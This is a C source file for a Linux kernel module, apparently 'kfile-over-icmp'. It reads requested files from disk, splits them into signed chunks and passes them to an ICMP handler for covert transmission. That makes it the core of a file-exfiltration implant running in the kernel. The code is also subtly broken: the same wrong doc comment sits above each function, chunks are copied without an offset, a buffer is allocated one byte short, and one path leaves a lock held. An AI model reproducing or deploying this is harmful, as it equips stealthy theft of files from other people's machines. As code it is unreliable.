#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/kthread.h>
#include <linux/sched.h>
#include <linux/version.h>
#include <linux/vmalloc.h>

#include "payload_generator.h"
#include "file_metadata.h"
#include "../chrdev/chrdev.h"

LIST_HEAD(g_chunk_list);
DEFINE_SPINLOCK(g_chunk_list_spinlock);

LIST_HEAD(g_data_modifiers_list);
DEFINE_MUTEX(g_data_modifiers_list_mutex);

struct task_struct* g_payload_generator_thread;
unsigned int g_payload_generator_thread_stop = 0;

static const char* payload_generator_thread_name = "kpayload";

/**
 * kmalloc_array - allocate memory for an array.
 * @n: number of elements.
 * @size: element size.
 * @flags: the type of memory to allocate (see kmalloc).
 */
int read_file_thread_func(void* data);

/**
 * kmalloc_array - allocate memory for an array.
 * @n: number of elements.
 * @size: element size.
 * @flags: the type of memory to allocate (see kmalloc).
 */
ssize_t safe_read_from_file(struct file *filp, char *file_data, size_t file_size, loff_t *current_position)
{
    // Read the file's content.
    // Few important notes:
    //      1. Traditionally, the common way of reading files in the kernel is by using VFS functions 
    //         like vfs_read. vfs_read invokes the f_ops of a given file to read it. In newer kernel
    //         versions, the functions kernel_read and kernel_write were introduced, replacing the "old" 
    //         vfs_XXX functions. using kernel_read and kernel_write is considered a good practice as it 
    //         eliminates the need of messing with the FS (explained in 2). However, and from a very 
    //         mysterious reason, kernel_read didn't work here - hence vfs_read is used.
    //      2. vfs_read expects to save the read data into a user-space buffer. In order to pass a 
    //         kernel-space allocated buffer to it, we need to overwriting the kernel' FS. By setting the
    //         kernel FS to KERNEL_DS, we actually tell it to expect a kernel-space buffer. Note that
    //         restoring the old FS after the call to vfs_read is super-important, otherwise kernel panic
    //         will be caused.
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
    mm_segment_t security_old_fs = get_fs();
    set_fs(get_ds());
    ssize_t size_read = vfs_read(filp, file_data, file_size, current_position);
    set_fs(security_old_fs);  
#else
    ssize_t size_read = kernel_read(filp, file_data, file_size, current_position);
#endif

    return size_read;  
}

/**
 * kmalloc_array - allocate memory for an array.
 * @n: number of elements.
 * @size: element size.
 * @flags: the type of memory to allocate (see kmalloc).
 */
void copy_signature_to_chunk(struct file_chunk *chunk, size_t file_size)
{
    // If it is the first chunk, we want to add a signature to it.
    struct new_file_signature signature;
    signature.file_size = file_size;

    memcpy(signature.signature, DEFAULT_NEW_FILE_SIGNATURE, sizeof(DEFAULT_NEW_FILE_SIGNATURE));
    memcpy(chunk->data, &signature, sizeof(struct new_file_signature));
    chunk->chunk_size += sizeof(struct new_file_signature);
}

/**
 * kmalloc_array - allocate memory for an array.
 * @n: number of elements.
 * @size: element size.
 * @flags: the type of memory to allocate (see kmalloc).
 * @note: no need to use locks as no one accesses the modifiers list in runtime.
 */
int run_data_modifiers_on_file(char *data, ssize_t *len)
{ 
    struct data_modifier *modifier;
    bool is_modifier_failed = false;

    mutex_lock(&g_data_modifiers_list_mutex);
    list_for_each_entry(modifier, &g_data_modifiers_list, l_head) {
        if (modifier->func(data, len)) {
            // TODO: keep going or abort?
            is_modifier_failed = true;
            break;
        }
    }
    mutex_unlock(&g_data_modifiers_list_mutex);

    return is_modifier_failed ? -EINVAL : 0;
}

/**
 * kmalloc_array - allocate memory for an array.
 * @n: number of elements.
 * @size: element size.
 * @flags: the type of memory to allocate (see kmalloc).
 */
void read_file_chunks(const char* file_path)
{
    // Open the file from user-space.
    struct file *filp;
    filp = filp_open(file_path, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        printk(KERN_ERR "kfile-over-icmp: failed to open %s. error: %ld\n", file_path, PTR_ERR(filp));
        return;
    }
    
    // Get the file size
    loff_t file_size = vfs_llseek(filp, 0, SEEK_END);
    loff_t current_position = vfs_llseek(filp, 0, 0);
    if (0 != current_position) {
        printk(KERN_ERR "kfile-over-icmp: failed to seek back to file's beginning. file path: %s\n", file_path);
        goto close_filp;
    }

    // 1. allocate data with size same as file_size, with vmalloc.
    char *file_data = (char*)vmalloc(file_size);
    if (NULL == file_data) {
        goto close_filp;
    }

    // Read the file's content.
    //ssize_t size_read = size_to_read;
    //current_position += size_to_read;
    ssize_t size_read = safe_read_from_file(filp, file_data, file_size, &current_position);

    // 3. run any modifiers on the file data
    run_data_modifiers_on_file(file_data, (ssize_t *)&file_size);

    // Split the file data to chunks
    bool is_first_chunk = true;
    current_position = 0;
    while (current_position < file_size) {
        struct file_chunk *new_chunk = (struct file_chunk *)kmalloc(sizeof(struct file_chunk), GFP_ATOMIC);
        if (NULL == new_chunk) {
            goto free_vmalloc;
        }

        new_chunk->data = (char *)kmalloc(get_default_payload_size(), GFP_ATOMIC);
        if (NULL == new_chunk->data) {
            kfree(new_chunk);
            goto free_vmalloc;
        }

        new_chunk->chunk_size = 0;

        size_t offset_in_buffer = 0;  // Will include the signature if it is the first chunk.
        size_t available_space_in_chunk = get_default_payload_size();

        if (is_first_chunk) {
            // If it is the first chunk, we want to add a signature to it.
            copy_signature_to_chunk(new_chunk, file_size);
            offset_in_buffer += sizeof(struct new_file_signature);
            available_space_in_chunk -= sizeof(struct new_file_signature);
            is_first_chunk = false;
        }

        ssize_t size_to_read = min(available_space_in_chunk, (size_t)(file_size - current_position));
        memcpy(new_chunk->data + offset_in_buffer, file_data, size_to_read);
        new_chunk->chunk_size += size_to_read;
        current_position += size_to_read;
        printk(KERN_DEBUG "%d!\n", current_position);

        unsigned long flags;
        spin_lock_irqsave(&g_chunk_list_spinlock, flags);
        list_add_tail(&(new_chunk->l_head), &g_chunk_list);
        spin_unlock_irqrestore(&g_chunk_list_spinlock, flags);
    }

free_vmalloc:
    vfree(file_data);
close_filp:
    filp_close(filp, NULL);
}

/**
 * kmalloc_array - allocate memory for an array.
 * @n: number of elements.
 * @size: element size.
 * @flags: the type of memory to allocate (see kmalloc).
 */
void process_next_pending_file(void)
{    
    mutex_lock(&g_requestd_files_list_mutex);
    bool is_list_empty = list_empty(&g_requestd_files_list);
    mutex_unlock(&g_requestd_files_list_mutex);
    if (is_list_empty) {
        // There are no pending files.
        return;    
    }

    mutex_lock(&g_requestd_files_list_mutex);
    struct file_metadata *next_pending_file;
    next_pending_file = list_first_entry_or_null(&g_requestd_files_list, struct file_metadata, l_head);
    if (NULL == next_pending_file) {
        goto release_mutex;
    }
    mutex_unlock(&g_requestd_files_list_mutex);

    // Copy the file path
    size_t next_pending_file_path_length = strlen(next_pending_file->file_path);
    char *file_path = (char*)kmalloc(next_pending_file_path_length, GFP_KERNEL);
    if (NULL == file_path) {
        // If we fail to allocate space for the file path - we do not want to remove it from
        // the list so we will be able to reach it in the next time. If we'll delete it right 
        // now - then the file won't be sent.
        return;
    }
    memcpy(file_path, next_pending_file->file_path, next_pending_file_path_length + 1);
    file_path[next_pending_file_path_length] = 0x00;

    // Remove the item from the list of pending files.
    // Also, free it as we are responsible for its memory.
    mutex_lock(&g_requestd_files_list_mutex);
    list_del(&next_pending_file->l_head);
    mutex_unlock(&g_requestd_files_list_mutex);

    kfree(next_pending_file->file_path);
    kfree(next_pending_file);

    // TODO: support saving only X chunks (for dealing with large files)
    // No need to acquire chunks_list_mutex as read_file_chunks does that internally.
    read_file_chunks(file_path);

    return;

release_mutex:
    mutex_unlock(&g_requestd_files_list_mutex);
}

int generate_payload(char *buffer, size_t *length)
{
    if (NULL == buffer) {
        return -EINVAL;
    }

    // Try to acquire the chunks spinlock.
    // We are using any blocking function to avoid latency in the ICMP communication.
    unsigned int flags;
    if (!spin_trylock_irqsave(&g_chunk_list_spinlock, flags)) {
        return -EIO;
    }

    if (list_empty(&g_chunk_list)) {
        goto error_and_spinlock_release;
    }

    struct file_chunk *next_chunk;
    next_chunk = list_first_entry_or_null(&g_chunk_list, struct file_chunk, l_head);
    if (NULL == next_chunk) {
        goto error_and_spinlock_release;
    }

    memcpy(buffer, next_chunk->data, next_chunk->chunk_size);
    *length = next_chunk->chunk_size;

    list_del(&(next_chunk->l_head));
    kfree(next_chunk->data);
    kfree(next_chunk);

error_and_spinlock_release:
    spin_unlock_irqrestore(&g_chunk_list_spinlock, flags);

    return 0;
}

int read_file_thread_func(void* data)
{
    while (!g_payload_generator_thread_stop) {
        // No need to use locks as process_next_pending_file does that internally.
        process_next_pending_file();
        // TODO: replace with completion variable later on.
        msleep(3000);
    }

    return 0;
}

int start_payload_generator_thread(void)
{
    g_get_payload_func = &generate_payload;
    g_payload_generator_thread = kthread_run(read_file_thread_func, NULL, payload_generator_thread_name);
    if (!g_payload_generator_thread) {
        return -EINVAL;
    }

    get_task_struct(g_payload_generator_thread);

    return 0;
}

void stop_payload_generator_thread(void)
{
    g_payload_generator_thread_stop = 1;
    kthread_stop(g_payload_generator_thread);
    put_task_struct(g_payload_generator_thread);  
}


int payload_generator_add_modifier(data_modifier_func func)
{
    struct data_modifier *modifier = (struct data_modifier *)kmalloc(sizeof(struct data_modifier), GFP_KERNEL);
    if (NULL == modifier) {
        return -ENOMEM;
    }

    modifier->func = func;

    mutex_lock(&g_data_modifiers_list_mutex);
    INIT_LIST_HEAD(&(modifier->l_head));
    list_add(&(modifier->l_head), &g_data_modifiers_list);
    mutex_unlock(&g_data_modifiers_list_mutex);
}

void payload_generator_remove_modifier(data_modifier_func func)
{
    struct list_head *pos = NULL;
    struct list_head *tmp = NULL;
    struct data_modifier *modifier = NULL;

    mutex_lock(&g_data_modifiers_list_mutex);

    list_for_each_safe(pos, tmp, &g_data_modifiers_list) {
        modifier = list_entry(pos, struct data_modifier, l_head);

        if (NULL == modifier)
            continue;

        if (func != modifier->func) 
            continue;

        list_del(pos);
        kfree(modifier);
    }

    mutex_unlock(&g_data_modifiers_list_mutex);
}

size_t get_default_payload_size(void)
{
    // TODO: check if less then the size of struct signature
    return DEFAULT_PAYLOAD_CHUNKS_SIZE;
}